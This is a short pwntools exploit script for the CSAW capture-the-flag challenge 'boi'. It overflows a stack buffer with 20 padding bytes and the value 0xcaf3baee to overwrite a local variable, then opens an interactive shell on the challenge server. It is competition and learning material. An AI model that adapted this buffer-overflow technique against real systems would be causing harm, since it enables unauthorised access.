from pwn import *
from binascii import *


def get_flag():
    context.arch = "amd64"
    local = False
    if local:
        c = process("./boi")
    else:
        c = remote("pwn.chal.csaw.io", 9000)
    o = c.recvline()            # recv the "Are you a big boiiii?"
    print("Received: ", o)
    dist_to_local = 0x30 - 0x1c
    local = 0xcaf3baee
    buf = b"A" * (dist_to_local) + pack(local)
    c.sendline(buf)
    o = c.recv(4096)
    print("Received final: ", o)
    c.interactive()


if __name__ == "__main__":
    get_flag()
